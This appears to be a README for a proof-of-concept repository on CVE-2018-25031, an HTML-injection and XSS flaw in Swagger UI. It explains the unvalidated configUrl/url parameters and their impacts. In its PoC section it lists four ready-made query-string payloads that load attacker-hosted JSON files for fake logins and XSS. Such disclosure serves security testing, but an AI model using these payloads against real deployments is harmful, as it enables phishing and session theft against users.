## Introduction: The Role of Swagger UI

**Swagger UI** is a widely used library that renders OpenAPI (formerly Swagger) specifications into an interactive web interface. It enables developers and integrators to explore and test APIs without having the backend implementation in place.

## CVE‑2018‑25031 Details

### **The Root Cause: Remote Specification Loading**

The vulnerability stems from insufficient validation of URL query parameters used to load remote configuration or specification files by the Swagger UI client. Common parameters involved are:

- `?url=.yaml`
- `?configUrl=.json`

An attacker can point these parameters at an attacker‑controlled OpenAPI definition or configuration file hosted remotely, which may be rendered by a vulnerable instance.

### **Potential Attack Vectors**

Loading a malicious remote file can enable several high‑impact outcomes depending on hosting configuration and safeguards in place:

1. **HTML Injection (HTMLi) / Phishing** - injected files can contain arbitrary HTML that visually spoofs content (for example, fake login forms), abusing the trusted domain of a self‑hosted instance.
2. **Cross‑Site Scripting (XSS)** - if injected content includes executable JavaScript, it can result in DOM XSS and allow session theft or actions on behalf of users.
3. **Server‑Side Request Forgery (SSRF)** - when servers fetch remote specifications on behalf of the client, an attacker may coerce the server to make requests to internal endpoints, potentially exposing sensitive resources.

**References:**

- [https://nvd.nist.gov/vuln/detail/CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)
- [https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers)

## Proof‑of‑Concept (POC)

### Payloads

### 1 - Login

`?configUrl=https://raw.githubusercontent.com/relichunt3r/swagger-ui/refs/heads/main/login.json`

### 2 - Remote Login

`?configUrl=https://raw.githubusercontent.com/relichunt3r/swagger-ui/refs/heads/main/remote-login.json`

### 3 - Image

`?configUrl=https://raw.githubusercontent.com/relichunt3r/swagger-ui/refs/heads/main/img.json`

### 4 - XSS

`?configUrl=https://raw.githubusercontent.com/relichunt3r/swagger-ui/refs/heads/main/xss.json`

## 📌 Disclaimer

The content in this repository is provided for educational and informational purposes only. The author is not responsible for any misuse. Ensure you have proper authorization before use, act responsibly at your own risk, and follow all legal and ethical guidelines.
